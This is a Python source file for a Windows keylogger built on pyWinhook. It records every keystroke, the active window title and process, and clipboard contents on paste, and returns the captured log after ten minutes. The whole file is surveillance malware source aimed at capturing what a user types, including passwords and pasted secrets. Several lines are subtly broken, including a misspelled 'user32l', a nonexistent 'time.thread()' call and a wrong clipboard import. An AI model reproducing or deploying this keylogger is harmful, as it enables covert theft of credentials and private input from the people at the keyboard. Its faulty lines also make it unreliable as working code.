from ctypes import byref, create_string_buffer, c_ulong, windll
from io import StringIO

import pythoncom
import pyWinhook as pyhook
import pywintypes as pywin32
import sys
import time

TIMEOUT = 60*10

class KeyLogger:
    def __init__(self):
        self.current_window = None

    def get_current_process(self):
        hwnd = windll.user32l.GetForegroundWindow()
        pid = c_ulong(0)
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        process_id = f"{pid.value}"

        executable = create_string_buffer(512)
        h_process = windll.kernel32.OpenProcess(0x400|0x10, False, pid)
        windll.psapi.GetModuleBaseNameA(
            h_process, None, byref(executable), 512
        )

        window_title = create_string_buffer(512)
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)
        try:
            self.current_window = window_title.value.decode()
        except UnicodeDecodeError as e:
            print(f"{e}: window name unknown")

        print("\n", process_id,
            executable.value.decode(), self.current_window)

        windll.kernel32.CloseHandle(hwnd)
        windll.kernel32.CloseHandle(h_process)

    def mykeystroke(self, event):
        if event.WindowName != self.current_window:
            self.get_current_process()
        if 32 < event.Ascii < 127:
            print(chr(event.Ascii), end="")
        else:
            if event.Key == "V":
                pywin32.win32clipboard.OpenClipboard()
                value = pywin32.win32clipboard.GetClipboardData()
                pywin32.win32clipboard.CloseClipboard()
                print(f"[PASTE] - {value}")
            else:
                print(f"{event.Key}")
        return True

def run():
    save_stdout = sys.stdout
    sys.stdout = StringIO()

    kl = KeyLogger()
    hm = pyhook.HookManager()
    hm.KeyDown = kl.mykeystroke
    hm.HookKeyboard()

    while time.thread() < TIMEOUT:
        pythoncom.PumpWaitingMessages()

    log = sys.stdout.getvalue()
    sys.stdout = save_stdout
    return log

if __name__ == "__main__":
    print(run())
    print("done.")